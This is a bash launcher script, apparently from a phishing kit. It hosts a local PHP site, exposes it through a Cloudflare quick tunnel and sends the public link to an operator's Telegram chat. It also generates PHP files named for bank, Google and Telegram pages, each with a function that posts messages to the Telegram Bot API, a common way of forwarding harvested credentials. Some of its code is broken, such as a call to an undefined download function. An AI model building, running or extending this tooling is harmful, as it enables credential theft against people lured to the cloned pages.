#!/bin/bash

config_dir=".www/config"
config_file="$config_dir/config.sh"

if [[ ! -f "$config_file" ]]; then
    echo -e "Telegram configuration not found. Creating $config_file...\n"

    read -p "Enter your Telegram Bot Token: " bot_token
    read -p "Enter your Telegram Chat ID: " chat_id

    echo -e "# Telegram Bot ID and Chat ID\nbot_token=\"$bot_token\"\nchat_id=\"$chat_id\"" > "$config_file"

    echo -e "\n# Sending functions for Telegram\n\nfunction send_telegram_message() {\n    local message=\"\$1\"\n    curl -s -X POST \"https://api.telegram.org/bot\$bot_token/sendMessage\" \\\n        -d \"chat_id=\$chat_id\" \\\n        -d \"text=\$message\" \\\n        -d \"parse_mode=Markdown\"\n}" >> "$config_file"

    echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} $config_file created successfully."
    echo -e "${GREEN}[${WHITE}+${GREEN}]${WHITE} You can now run the script again.\n"
    exit 0
fi

# Source the configuration file
source "$config_file"

host='127.0.0.1'
port='8084'

GREEN='\033[0;32m'
WHITE='\033[1;37m'
MAGENTA='\033[0;35m'

generate_config_file() {
    local file_name="$1.php"
    local config_file="$config_dir/$file_name"

    echo -e "<?php\n\n# Telegram Bot ID and Chat ID\n\$bot_token = \"$bot_token\";\n\$chat_id = \"$chat_id\";\n\n# Sending function for Telegram\n\nfunction send_telegram_message(\$message) {\n    global \$bot_token, \$chat_id;\n    \$url = \"https://api.telegram.org/bot\$bot_token/sendMessage\";\n    \$data = [\n        'chat_id' => \$chat_id,\n        'text' => \$message,\n        'parse_mode' => 'Markdown',\n    ];\n\n    \$options = [\n        'http' => [\n            'header' => \"Content-type: application/x-www-form-urlencoded\\r\\n\",\n            'method' => 'POST',\n            'content' => http_build_query(\$data),\n        ],\n    ];\n\n    \$context = stream_context_create(\$options);\n    file_get_contents(\$url, false, \$context);\n}\n" > "$config_file"

    echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} $config_file created successfully."
}

setup_clone() {
    cd .www && php -S "$host":"$port" > /dev/null 2>&1 &
}

cloudflared_download_and_install() {
    if [[ -e ".host/cloudflared" ]]; then
        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
        sleep 1
    else
        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${MAGENTA} Downloading and Installing Cloudflared..."${WHITE}
        architecture=$(uname -m)
        get_cloudflared_url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-"

        case "$architecture" in
            *'arm'*) get_cloudflared "$get_cloudflared_url"arm ;;
            *'aarch64'*) get_cloudflared "$get_cloudflared_url"arm64 ;;
            *'x86_64'*) get_cloudflared "$get_cloudflared_url"amd64 ;;
            *) get_cloudflared "$get_cloudflared_url"386 ;;
        esac
    fi
}

start_cloudflare_tunnel() {
    { sleep 1; setup_clone; }

    if command -v termux-chroot; then
        sleep 2 && termux-chroot ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log 2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log 2>&1 & > /dev/null 2>&1 &
    fi

    { sleep 12; clear; }
}

sudo apt-get update
cloudflared_download_and_install
start_cloudflare_tunnel

cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".tunnels_log/.cloudfl.log")
cldflr_url1=${cldflr_url#https://}
telegram_message="link: $cldflr_url"
send_telegram_message "$telegram_message"

# Generate config files
generate_config_file "telegram"
generate_config_file "link"
generate_config_file "bank"
generate_config_file "google"

echo "-----PROJECT LAUNCHED------"
